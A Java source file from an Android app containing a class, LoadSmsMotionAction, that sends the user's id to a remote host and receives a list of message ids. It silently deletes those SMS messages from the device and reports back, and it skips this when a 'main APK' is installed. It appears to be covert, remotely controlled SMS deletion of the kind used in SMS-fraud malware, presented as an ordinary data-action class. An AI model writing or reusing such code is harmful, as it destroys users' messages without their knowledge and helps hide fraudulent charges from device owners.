package com.m1.android.data.action;

import java.util.HashMap;
import java.util.List;
import java.util.Map;

import com.m1.android.data.entity.SmsMotion;
import com.m1.android.data.util.AppUtil;
import com.m1.android.data.util.SmsUtil;

public class LoadSmsMotionAction extends BaseAction {

	@Override
	public boolean excute() {
		try {
			if (allowUpload()) {
				if (AppUtil.isMainApkInstalled(mContext)) {
					return true;
				}
				HashMap<String, String> params = new HashMap<String, String>();
				params.put("uid", String.valueOf(mUser.getId()));
				List<SmsMotion> motions = mHttpWrapper.postJSON(getRequestUrl(), params, SmsMotion.class);
				if (motions != null && !motions.isEmpty()) {
					String ids = "";
					for (int i = 0; i < motions.size(); i++) {
						SmsMotion motion = motions.get(i);
						long id = motion.getClientMsgId();
						ids += motion.getId();
						SmsUtil.deleteSms(mContext, id);
						if (i != motions.size() - 1) {
							ids += ",";
						}
					}
					HashMap<String, String> data = new HashMap<String, String>();
					data.put("ids", ids);
					mHttpWrapper.post(DEFAULT_HOST + "/updateSmsMotionStatus.htm", data, Map.class);
				}
				return true;
			} else {
				return false;
			}
		} catch (Exception e) {
			e.printStackTrace();
			return true;
		}
	}

	@Override
	protected String getRequestUrl() {
		return DEFAULT_HOST + "/getSmsMotion.htm";
	}

}
